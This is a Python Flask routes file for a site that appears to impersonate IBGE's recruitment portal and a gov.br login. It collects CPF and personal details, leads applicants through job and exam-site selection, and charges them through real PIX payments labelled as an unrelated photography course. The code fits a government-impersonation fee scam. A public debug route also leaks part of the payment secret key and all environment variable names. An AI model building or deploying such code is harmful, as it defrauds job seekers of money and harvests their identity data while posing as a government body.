from flask import render_template, request, jsonify, session, redirect
from models import ConcursoPublico, ProcessoSeletivo, VagaEstagio, CookieConsent
import requests
import qrcode
from io import BytesIO
import base64

def register_routes(app):
    """Registrar todas as rotas da aplicação"""
    
    @app.route('/')
    def index():
        """Página principal - Trabalhe Conosco IBGE"""
        concursos = ConcursoPublico.query.filter_by(status='ativo').all()
        processos = ProcessoSeletivo.query.filter_by(status='ativo').all()
        estagios = VagaEstagio.query.filter_by(status='ativo').all()
        
        return render_template('index.html', 
                             concursos=concursos,
                             processos=processos, 
                             estagios=estagios)

    @app.route('/concursos')
    def concursos():
        """Página de concursos públicos"""
        concursos_ativos = ConcursoPublico.query.filter_by(status='ativo').all()
        return render_template('concursos.html', concursos=concursos_ativos)

    @app.route('/processos_seletivos')
    def processos_seletivos():
        """Página de processos seletivos"""
        processos_ativos = ProcessoSeletivo.query.filter_by(status='ativo').all()
        return render_template('processos_seletivos.html', processos=processos_ativos)

    @app.route('/estagios')
    def estagios():
        """Página de estágios"""
        estagios_ativos = VagaEstagio.query.filter_by(status='ativo').all()
        return render_template('estagios.html', estagios=estagios_ativos)

    @app.route('/login')
    def login():
        """Página de login gov.br"""
        return render_template('login.html')

    @app.route('/api/validate-cpf', methods=['POST'])
    def validate_cpf():
        """API para validar CPF e carregar dados gov.br"""
        data = request.get_json()
        cpf = data.get('cpf', '').replace('.', '').replace('-', '')
        
        # Simulação de dados gov.br
        user_data = {
            'nome_completo': 'João Silva Santos',
            'nome_mae': 'Maria Silva Santos',
            'data_nascimento': '15/03/1985',
            'cpf': cpf,
            'rg': '12.345.678-9',
            'naturalidade': 'São Paulo - SP',
            'sexo': 'Masculino',
            'estado_civil': 'Casado(a)'
        }
        
        session['user_data'] = user_data
        return jsonify({'success': True, 'data': user_data})



    @app.route('/selecao-cargo')
    def selecao_cargo():
        """Página de seleção de cargo"""
        return render_template('selecao_cargo.html')

    @app.route('/confirmacao-dados')
    def confirmacao_dados():
        """Página de confirmação de dados"""
        
        # Dados do usuário para o template
        usuario_data = session.get('user_data', {})
        
        # Se não há dados na sessão, usar dados padrão vazios
        usuario = {
            'nome_completo': usuario_data.get('nome_completo', ''),
            'cpf': usuario_data.get('cpf', ''),
            'rg': usuario_data.get('rg', ''),
            'data_nascimento': usuario_data.get('data_nascimento', ''),
            'sexo': usuario_data.get('sexo', ''),
            'estado_civil': usuario_data.get('estado_civil', ''),
            'nome_mae': usuario_data.get('nome_mae', ''),
            'nome_pai': usuario_data.get('nome_pai', ''),
            'naturalidade': usuario_data.get('naturalidade', '')
        }
        
        # Buscar CEP dos parâmetros da URL
        cep_url = request.args.get('cep', '').replace('-', '').replace(' ', '')
        
        # Dados de endereço - buscar via ViaCEP se CEP fornecido
        endereco = {
            'cep': '',
            'logradouro': '',
            'numero': '',
            'complemento': '',
            'bairro': '',
            'cidade': '',
            'uf': ''
        }
        
        if cep_url and len(cep_url) == 8:
            try:
                # Buscar dados do CEP via ViaCEP
                response = requests.get(f'https://viacep.com.br/ws/{cep_url}/json/', timeout=5)
                if response.status_code == 200:
                    cep_data = response.json()
                    if 'erro' not in cep_data:
                        endereco = {
                            'cep': cep_url,
                            'logradouro': cep_data.get('logradouro', ''),
                            'numero': '',
                            'complemento': '',
                            'bairro': cep_data.get('bairro', ''),
                            'cidade': cep_data.get('localidade', ''),
                            'uf': cep_data.get('uf', '')
                        }
            except:
                # Se falhar, manter endereço vazio
                pass
        
        # Dados de contato
        contato = {
            'telefone': '',
            'telefone_alt': '',
            'email': ''
        }
        
        # Dados de cargo baseados no parâmetro
        cargo_param = request.args.get('cargo', 'agente')
        categoria_cnh = request.args.get('categoria_cnh', 'D')
        
        if cargo_param == 'supervisor':
            cargo_selecionado = 'Supervisor de Coleta e Qualidade'
            vagas_disponivel = '1.245'
            mostrar_categoria_cnh = True
        else:
            cargo_selecionado = 'Agente de Pesquisas e Mapeamento'
            vagas_disponivel = '7.825'
            mostrar_categoria_cnh = True
        
        return render_template('confirmacao_dados.html', 
                             usuario=usuario, 
                             endereco=endereco, 
                             contato=contato, 
                             cargo_selecionado=cargo_selecionado,
                             vagas_disponivel=vagas_disponivel,
                             categoria_cnh=categoria_cnh,
                             mostrar_categoria_cnh=mostrar_categoria_cnh)

    @app.route('/selecao-local-prova')
    def selecao_local_prova():
        """Página de seleção do local da prova"""
        # Carregar página imediatamente sem processamento lento
        return render_template('selecao_local_prova.html')

    # API removida - funcionalidade de busca de escolas não é mais necessária
    # A página /selecao-local-prova agora usa apenas termo de concordância

    @app.route('/checkout')
    def checkout():
        """Página de checkout PIX"""
        return render_template('checkout.html')

    @app.route('/gerar-pix', methods=['POST'])
    def gerar_pix():
        """API para gerar pagamento PIX"""
        try:
            data = request.get_json()
            print(f"[PIX DEBUG] Dados recebidos: {data}")

            # Validar dados obrigatórios
            required_fields = ['name', 'email', 'cpf', 'amount']
            for field in required_fields:
                if not data.get(field):
                    print(f"[PIX DEBUG] Campo obrigatório ausente: {field}")
                    return jsonify({'erro': f'Campo {field} é obrigatório'}), 400

            print("[PIX DEBUG] Importando módulos da nova implementação...")
            from for4_payments import For4PaymentsAPI, PaymentRequestData, gerar_codigo_pix_simulado

            print("[PIX DEBUG] Preparando dados do pagamento...")
            payment_data = PaymentRequestData(
                name=data['name'],
                email=data['email'],
                cpf=data['cpf'],
                amount=int(data['amount']),  # Valor em centavos
                phone=data.get('phone'),
                description="CURSO TECNICO FOTOGRAFO AVANCE"
            )

            print("[PIX DEBUG] Tentando usar API For4Payments real...")
            try:
                api = For4PaymentsAPI.from_env()
                response = api.create_pix_payment(payment_data)
                print(f"[PIX DEBUG] ✓ PIX real gerado com sucesso: {response.id}")
                
                return jsonify({
                    'success': True,
                    'payment_id': response.id,
                    'pix_code': response.pix_code,
                    'pix_qr_code': response.pix_qr_code,
                    'expires_at': response.expires_at,
                    'status': response.status,
                    'pix_real': True
                })
                
            except Exception as api_error:
                print(f"[PIX DEBUG] ❌ Erro na API For4Payments: {api_error}")
                print("[PIX DEBUG] Gerando PIX de demonstração como fallback...")
                
                # PIX de demonstração usando nova implementação
                import uuid

                import io
                import base64
                import random
                from datetime import datetime, timedelta
                
                # Gerar protocolo e PIX simulado
                protocolo = f"PAY-2025-{random.randint(100000, 999999)}"
                valor_final = data['amount'] / 100  # Converter de centavos para reais
                
                # Usar função melhorada de PIX simulado
                pix_code_simulado = gerar_codigo_pix_simulado(valor_final, protocolo)
                
                # Gerar QR code
                qr = qrcode.QRCode(
                    version=1,
                    box_size=10,
                    border=4,
                )
                qr.add_data(pix_code_simulado)
                qr.make(fit=True)
                
                img = qr.make_image(fill_color="black", back_color="white")
                img_buffer = io.BytesIO()
                img.save(img_buffer, format='PNG')
                img_str = base64.b64encode(img_buffer.getvalue()).decode()
                
                print("[PIX DEBUG] ✓ PIX de demonstração gerado com sucesso")
                
                return jsonify({
                    'success': True,
                    'payment_id': f"demo_{uuid.uuid4().hex[:12]}",
                    'pix_code': pix_code_simulado,
                    'pix_qr_code': f"data:image/png;base64,{img_str}",
                    'expires_at': (datetime.now() + timedelta(minutes=30)).isoformat(),
                    'status': 'pending',
                    'pix_simulado': True
                })

        except Exception as e:
            import traceback
            print(f"[PIX ERROR] Erro ao gerar PIX: {str(e)}")
            print(f"[PIX ERROR] Traceback completo: {traceback.format_exc()}")
            return jsonify({'erro': 'Erro interno do servidor'}), 500

    @app.route('/api/verificar-pagamento-pix', methods=['POST'])
    def verificar_pagamento_pix():
        """API para verificar status do pagamento PIX em tempo real"""
        try:
            data = request.get_json()
            payment_id = data.get('payment_id') or session.get('payment_id')
            
            if not payment_id:
                return jsonify({
                    'sucesso': False,
                    'erro': 'ID do pagamento não encontrado'
                })
            
            # Verificar se é pagamento de demonstração
            if payment_id.startswith('demo_'):
                print(f"[PIX DEBUG] Verificando pagamento de demonstração: {payment_id}")
                return jsonify({
                    'sucesso': True,
                    'status': 'pendente',
                    'message': 'Pagamento em demonstração - sempre pendente'
                })
            
            # Usar API For4Payments para verificação real
            try:
                from for4_payments import For4PaymentsAPI
                api = For4PaymentsAPI.from_env()
                status_result = api.check_payment_status(payment_id)
                
                if status_result.get('status') == 'error':
                    return jsonify({
                        'sucesso': False,
                        'erro': status_result.get('message', 'Erro na verificação')
                    })
                
                # Determinar status final
                if status_result.get('paid'):
                    return jsonify({
                        'sucesso': True,
                        'status': 'aprovado',
                        'redirecionar': '/sucesso'
                    })
                elif status_result.get('failed'):
                    return jsonify({
                        'sucesso': True,
                        'status': 'rejeitado'
                    })
                else:
                    return jsonify({
                        'sucesso': True,
                        'status': 'pendente'
                    })
                    
            except Exception as api_error:
                print(f"[PIX DEBUG] Erro na API For4Payments: {str(api_error)}")
                return jsonify({
                    'sucesso': False,
                    'erro': 'Erro na verificação do pagamento'
                })
                
        except Exception as e:
            print(f"[PIX DEBUG] Erro na verificação de pagamento: {str(e)}")
            return jsonify({
                'sucesso': False,
                'erro': 'Erro interno do servidor'
            })

    @app.route('/verificar-pagamento/<payment_id>')
    def verificar_pagamento(payment_id):
        """API para verificar status do pagamento (compatibilidade)"""
        try:
            from for4_payments import For4PaymentsAPI
            
            api = For4PaymentsAPI.from_env()
            status = api.check_payment_status(payment_id)
            
            return jsonify(status)
        except Exception as e:
            print(f"Erro ao verificar pagamento: {str(e)}")
            return jsonify({'erro': 'Erro ao verificar pagamento'}), 500

    @app.route('/debug-for4payments')
    def debug_for4payments():
        """Debug da configuração For4Payments"""
        import os
        try:
            # Verificar se a chave existe
            secret_key = os.getenv("FOR4PAYMENTS_SECRET_KEY")
            
            debug_info = {
                'api_key_configured': bool(secret_key),
                'api_key_length': len(secret_key) if secret_key else 0,
                'api_key_preview': secret_key[:10] + '...' if secret_key and len(secret_key) > 10 else 'Não configurada',
                'environment_vars': list(os.environ.keys())
            }
            
            # Tentar criar instância da API
            try:
                from for4_payments import For4PaymentsAPI
                api = For4PaymentsAPI.from_env()
                debug_info['api_instance_created'] = True
                debug_info['api_url'] = api.API_URL
            except Exception as e:
                debug_info['api_instance_created'] = False
                debug_info['api_error'] = str(e)
            
            return jsonify(debug_info)
            
        except Exception as e:
            return jsonify({'error': str(e)}), 500

    @app.route('/accept-cookies', methods=['POST'])
    def accept_cookies():
        """API para aceitar cookies"""
        try:
            from app import db
            consent = CookieConsent()
            consent.ip_address = request.remote_addr
            consent.user_agent = request.headers.get('User-Agent', '')
            consent.consent_type = 'accepted'
            
            db.session.add(consent)
            db.session.commit()
            
            return jsonify({'success': True})
        except Exception as e:
            print(f"Erro ao salvar consent: {str(e)}")
            return jsonify({'success': False}), 500

    # Páginas estáticas
    @app.route('/mais-informacoes')
    def mais_informacoes():
        return render_template('mais_informacoes.html')

    @app.route('/atendimento')
    def atendimento():
        return render_template('atendimento.html')

    @app.route('/apps-ibge')
    def apps_ibge():
        return render_template('apps_ibge.html')

    @app.route('/transparencia')
    def transparencia():
        return render_template('transparencia.html')

    @app.route('/privacidade')
    def privacidade():
        return render_template('privacidade.html')

    @app.route('/orgaos-governo')
    def orgaos_governo():
        return render_template('orgaos_governo.html')

    @app.route('/edital-completo')
    def edital_completo():
        return render_template('edital_completo.html')

    @app.route('/confirmar-local-prova', methods=['POST'])
    def confirmar_local_prova():
        """Confirmar seleção do local da prova"""
        escola_selecionada = request.form.get('escola_selecionada')

        if not escola_selecionada:
            return redirect('/selecao-local-prova')

        # Salvar escola selecionada na sessão
        session['local_prova'] = escola_selecionada

        # Redirecionar para checkout
        return redirect('/checkout')